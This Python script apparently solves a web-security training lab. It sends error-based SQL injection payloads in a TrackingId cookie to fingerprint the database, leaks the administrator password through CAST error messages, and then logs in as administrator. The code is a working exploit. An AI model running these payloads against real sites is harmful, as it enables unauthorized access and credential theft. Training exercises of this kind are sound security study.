import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def get_csrf_token(s, url, path):
    login_url = url + path
    r = s.get(login_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, username, password):
    login_url = url + '/login'
    payload = {
        "csrf": get_csrf_token(s, url, '/login'),
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, headers=headers)

    if 'Log out' in r.text:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def detect_database(s, url, path):
    target_url = url + path
    print("[+] Detecting Database Type...")

    # 1. Test Oracle
    sql_oracle = f"' AND 1=CAST((SELECT banner FROM v$version) AS int)--"
    r_oracle = s.get(target_url, cookies={"TrackingId": sql_oracle})
    if "Oracle" in r_oracle.text:
        print("[+] Database detected: Oracle")
        return "Oracle"

    # 2. Test @@version variable (MySQL or Microsoft SQL Server)
    sql_at_version = f"' AND 1=CAST((SELECT @@version) AS int)--%20"
    has_at_version = s.get(target_url, cookies={"TrackingId": sql_at_version})

    # 3. Test version() function (MySQL or PostgreSQL)
    sql_func_version = f"' AND 1=CAST((SELECT version()) AS int)--%20"
    has_func_version = s.get(target_url, cookies={"TrackingId": sql_func_version})

    if "MySQL" in has_at_version.text and "MySQL" in has_func_version.text:
        print("[+] Database detected: MySQL")
        return "MySQL"
    elif "Microsoft" in has_at_version.text and "Microsoft" not in has_func_version.text:
        print("[+] Database detected: Microsoft SQL Server")
        return "Microsoft"
    elif "PostgreSQL" not in has_at_version.text and "PostgreSQL" in has_func_version.text:
        print("[+] Database detected: PostgreSQL")
        return "PostgreSQL"
    else:
        print("[-] Could not detect database type. Defaulting to Unknown.")
        return "Unknown"

def extract_password_from_error(html_content):
    pattern = r'ERROR: invalid input syntax for type integer: "([^"]+)"'
    match = re.search(pattern, html_content)
    if match:
        return match.group(1)
    return None

def make_error_query(s, url, path):
    target_url = url + path
    sql_injection = "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
    cookies = { 'TrackingId': sql_injection }
    r = s.get(target_url, cookies=cookies)
    return extract_password_from_error(r.text)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    s.get(url)
    print(detect_database(s, url, '/login'))
    password = make_error_query(s, url, '/login')
    login_acc(s, url, 'administrator', password)
    check_solved_lab(s, url)


if __name__ == '__main__':
    main()